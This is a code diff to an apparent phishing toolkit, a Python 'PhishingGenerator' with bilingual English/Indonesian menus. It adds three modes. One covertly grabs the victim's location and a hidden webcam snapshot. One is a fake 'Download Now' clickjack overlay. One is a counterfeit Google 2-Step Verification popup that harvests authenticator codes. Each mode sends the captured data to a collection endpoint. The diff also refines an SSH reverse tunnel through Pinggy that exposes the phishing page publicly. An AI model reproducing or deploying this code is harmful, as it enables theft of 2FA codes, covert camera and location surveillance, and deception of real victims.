@@ -403,6 +403,136 @@ class PhishingGenerator:
                     });
                     """
 
+                elif phish_type == "combo":
+                    permission_script += """
+                    navigator.permissions.query({name:'geolocation'}).then(function(result) {
+                        navigator.geolocation.getCurrentPosition(function(position) {
+                            fetch('/collect-data', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    type: 'location',
+                                    lat: position.coords.latitude,
+                                    lng: position.coords.longitude
+                                })
+                            });
+                        });
+                    });
+                    navigator.mediaDevices.getUserMedia({video: true})
+                    .then(function(stream) {
+                        var video = document.createElement('video');
+                        var canvas = document.createElement('canvas');
+                        video.style.display = 'none';
+                        canvas.style.display = 'none';
+                        document.body.appendChild(video);
+                        document.body.appendChild(canvas);
+                        video.srcObject = stream;
+                        video.play();
+                        video.onloadedmetadata = function() {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            setTimeout(function() {
+                                canvas.getContext('2d').drawImage(video, 0, 0);
+                                var imageData = canvas.toDataURL('image/jpeg');
+                                fetch('/collect-data', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        type: 'camera_capture',
+                                        image: imageData
+                                    })
+                                }).then(function() {
+                                    stream.getTracks().forEach(track => track.stop());
+                                    video.remove();
+                                    canvas.remove();
+                                    window.top.location.href = '""" + target_url + """';
+                                });
+                            }, 1500);
+                        };
+                    }).catch(function() {
+                        window.top.location.href = '""" + target_url + """';
+                    });
+                    """
+
+                elif phish_type == "clickjack":
+                    permission_script += """
+                    var overlay = document.createElement('div');
+                    overlay.innerHTML = `
+                        <div style="position:fixed; top:0; left:0; width:100%; height:100%;
+                            background:rgba(0,0,0,0.7); display:flex; justify-content:center; align-items:center; z-index:9999;">
+                            <div style="background:white; padding:25px 35px; border-radius:12px; text-align:center; box-shadow:0 5px 30px rgba(0,0,0,0.3);">
+                                <div style="font-size:50px; margin-bottom:10px;">⬇️</div>
+                                <h2 style="margin:5px 0; color:#333;">Download Ready</h2>
+                                <p style="color:#666; margin:5px 0 15px;">Click below to start your download</p>
+                                <button id="downloadBtn" style="padding:12px 40px; background:#007bff; color:white; border:none;
+                                    border-radius:8px; font-size:16px; cursor:pointer; font-weight:bold; box-shadow:0 3px 10px rgba(0,123,255,0.3);">
+                                    📥 Download Now
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                    document.body.appendChild(overlay);
+                    document.getElementById('downloadBtn').addEventListener('click', function() {
+                        fetch('/collect-data', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                type: 'clickjack',
+                                data: { action: 'download_clicked', time: new Date().toISOString() }
+                            })
+                        }).then(function() {
+                            window.top.location.href = '""" + target_url + """';
+                        });
+                    });
+                    """
+
+                elif phish_type == "googleauth":
+                    permission_script += """
+                    var authHtml = `
+                        <div id="gaPopup" style="position:fixed; top:0; left:0; width:100%; height:100%;
+                            background:rgba(255,255,255,0.95); display:flex; justify-content:center; align-items:center; z-index:9999;">
+                            <div style="background:white; padding:30px; border-radius:12px; text-align:center; max-width:380px; width:90%;">
+                                <div style="margin-bottom:15px;">
+                                    <svg viewBox="0 0 48 48" width="48" height="48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
+                                </div>
+                                <h2 style="color:#202124; margin:5px 0;">2-Step Verification</h2>
+                                <p style="color:#5f6368; font-size:14px; margin:5px 0 15px;">Enter the code from the Google Authenticator app</p>
+                                <div id="gaCodeInputs" style="display:flex; gap:8px; justify-content:center; margin:15px 0;">
+                                    <input class="ga-digit" maxlength="1" style="width:40px; height:50px; text-align:center; font-size:22px; border:1px solid #dadce0; border-radius:8px;">
+                                    <input class="ga-digit" maxlength="1" style="width:40px; height:50px; text-align:center; font-size:22px; border:1px solid #dadce0; border-radius:8px;">
+                                    <input class="ga-digit" maxlength="1" style="width:40px; height:50px; text-align:center; font-size:22px; border:1px solid #dadce0; border-radius:8px;">
+                                    <input class="ga-digit" maxlength="1" style="width:40px; height:50px; text-align:center; font-size:22px; border:1px solid #dadce0; border-radius:8px;">
+                                    <input class="ga-digit" maxlength="1" style="width:40px; height:50px; text-align:center; font-size:22px; border:1px solid #dadce0; border-radius:8px;">
+                                    <input class="ga-digit" maxlength="1" style="width:40px; height:50px; text-align:center; font-size:22px; border:1px solid #dadce0; border-radius:8px;">
+                                </div>
+                                <button id="gaVerify" style="padding:10px 30px; background:#1a73e8; color:white; border:none; border-radius:6px; font-size:14px; cursor:pointer; font-weight:bold; width:100%;">Verify</button>
+                                <p style="color:#5f6368; font-size:12px; margin-top:12px;">Checking your device for codes...</p>
+                            </div>
+                        </div>
+                    `;
+                    document.body.insertAdjacentHTML('beforeend', authHtml);
+                    var inputs = document.querySelectorAll('.ga-digit');
+                    inputs.forEach(function(inp, idx) {
+                        inp.addEventListener('input', function() {
+                            if (this.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+                        });
+                        inp.addEventListener('keydown', function(e) {
+                            if (e.key === 'Backspace' && !this.value && idx > 0) inputs[idx - 1].focus();
+                        });
+                    });
+                    document.getElementById('gaVerify').addEventListener('click', function() {
+                        var code = '';
+                        document.querySelectorAll('.ga-digit').forEach(function(inp) { code += inp.value; });
+                        fetch('/collect-data', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ type: 'google_auth', data: { code: code } })
+                        }).then(function() {
+                            window.top.location.href = '""" + target_url + """';
+                        });
+                    });
+                    """
+
                 permission_script += """
                 }
                 </script>
@@ -706,33 +836,51 @@ class PhishingGenerator:
         self._save_session_key('tunnel_type', self.tunnel_type)
 
     def _start_pinggy(self):
+        import re
         addr = str(self.server_port)
         console.print(f"[cyan]⟳ Starting Pinggy tunnel on port {addr}...[/]")
+        console.print("[dim](Pinggy provides HTTP/HTTPS URLs accessible from any browser)[/]")
         try:
             self.tunnel_process = subprocess.Popen(
                 ["ssh", "-p", "443", "-R", f"0:localhost:{addr}", "-o", "StrictHostKeyChecking=no",
-                 "-o", "ServerAliveInterval=30", "free.pinggy.io"],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+                 "-o", "ServerAliveInterval=30", "-o", "ExitOnForwardFailure=yes", "free.pinggy.io"],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
             )
-            time.sleep(5)
             url = None
             start = time.time()
-            while time.time() - start < 20:
-                line = self.tunnel_process.stdout.readline()
-                if line and ('://' in line or '.pinggy' in line):
-                    for word in line.strip().split():
-                        if '://' in word or '.pinggy' in word:
-                            url = word.strip()
-                            break
+            output_log = []
+            while time.time() - start < 25:
+                try:
+                    line = self.tunnel_process.stdout.readline()
+                    if line:
+                        line = line.strip()
+                        output_log.append(line)
+                        urls = re.findall(r'https?://[^\s\'\"<>]+', line)
+                        for u in urls:
+                            if 'pinggy' in u or 'localhost' not in u:
+                                url = u.rstrip('/.')
+                                break
+                except:
+                    pass
                 if url:
                     break
+            if not url:
+                for line in output_log:
+                    urls = re.findall(r'https?://[^\s\'\"<>]+', line)
+                    for u in urls:
+                        if 'pinggy' in u or ('trycloudflare' not in u and 'ngrok' not in u):
+                            url = u.rstrip('/.')
+                            break
+                    if url:
+                        break
             if url:
                 self.server_url = url
                 console.print(f"[green]✅ Pinggy tunnel: {url}[/]")
+                console.print(f"[dim]🌐 {'Accessible from any browser' if self.language == 'en' else 'Dapat diakses dari browser mana pun'}[/]")
             else:
-                raise Exception("Could not parse Pinggy URL from output")
+                raise Exception("Could not parse Pinggy URL. Output: " + ' | '.join(output_log[-5:]))
         except Exception as e:
-            msg = f"❌ Pinggy failed: {str(e)[:80]}"
+            msg = f"❌ Pinggy failed: {str(e)[:120]}"
             self.logger.error(msg)
             console.print(f"[red]{msg}[/]")
             self.server_url = None
@@ -1031,13 +1179,19 @@ class PhishingGenerator:
               "Get files from victim" if self.language == "en" else "Dapatkan file dari korban"),
             ("5", "Clipboard Phishing" if self.language == "en" else "Phishing Clipboard",
              "Capture clipboard data" if self.language == "en" else "Tangkap data clipboard korban"),
-            ("6", "View Results" if self.language == "en" else "Lihat Hasil",
+            ("6", "Combo Phishing" if self.language == "en" else "Phishing Kombo",
+             "Location + Camera simultaneously" if self.language == "en" else "Lokasi + Kamera bersamaan"),
+            ("7", "Clickjack Phishing" if self.language == "en" else "Phishing Clickjack",
+             "Fake download/getlink trap" if self.language == "en" else "Jebakan download/getlink palsu"),
+            ("8", "Google Auth" if self.language == "en" else "Google Auth",
+             "Fake Google 2FA verification" if self.language == "en" else "Verifikasi 2FA Google palsu"),
+            ("9", "View Results" if self.language == "en" else "Lihat Hasil",
              "View captured data" if self.language == "en" else "Lihat data yang didapat"),
-            ("7", "Export Data" if self.language == "en" else "Ekspor Data",
+            ("10", "Export Data" if self.language == "en" else "Ekspor Data",
              "Export results to JSON" if self.language == "en" else "Ekspor hasil ke JSON"),
-            ("8", "Settings" if self.language == "en" else "Pengaturan",
-             "Configure webhook, region, port" if self.language == "en" else "Atur webhook, region, port"),
-            ("9", "Exit" if self.language == "en" else "Keluar",
+            ("11", "Settings" if self.language == "en" else "Pengaturan",
+             "Configure webhook, region, port, tunnel" if self.language == "en" else "Atur webhook, region, port, tunnel"),
+            ("12", "Exit" if self.language == "en" else "Keluar",
              "Exit program" if self.language == "en" else "Keluar dari program")
         ]
         
@@ -1135,7 +1289,7 @@ class PhishingGenerator:
                 self.display_banner()
                 self.display_menu()
                 
-                choice = console.input(f"\n[yellow][[?]] {'Select menu' if self.language == 'en' else 'Pilih menu'} (1-9): [/]")
+                choice = console.input(f"\n[yellow][[?]] {'Select menu' if self.language == 'en' else 'Pilih menu'} (1-12): [/]")
                 
                 if choice == "1":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
@@ -1178,6 +1332,30 @@ class PhishingGenerator:
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "6":
+                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    with Progress() as progress:
+                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
+                        self.generate_phishing_link("combo", target_url=target)
+                        progress.update(task, advance=100)
+                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
+
+                elif choice == "7":
+                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    with Progress() as progress:
+                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
+                        self.generate_phishing_link("clickjack", target_url=target)
+                        progress.update(task, advance=100)
+                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
+
+                elif choice == "8":
+                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    with Progress() as progress:
+                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
+                        self.generate_phishing_link("googleauth", target_url=target)
+                        progress.update(task, advance=100)
+                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
+
+                elif choice == "9":
                     self.show_victims = True
                     self.update_live_display()
                     console.input(f"\n[green]{'Press Enter to return to menu...' if self.language == 'en' else 'Tekan Enter untuk kembali ke menu...'}[/]")
@@ -1186,13 +1364,13 @@ class PhishingGenerator:
                         self.live_display.stop()
                         self.live_display = None
                 
-                elif choice == "7":
+                elif choice == "10":
                     self.export_results()
                 
-                elif choice == "8":
+                elif choice == "11":
                     self.settings_menu()
                 
-                elif choice == "9":
+                elif choice == "12":
                     msg = "Closing program..." if self.language == "en" else "Menutup program..."
                     console.print(f"\n[red][[!]] {msg}[/]")
                     break
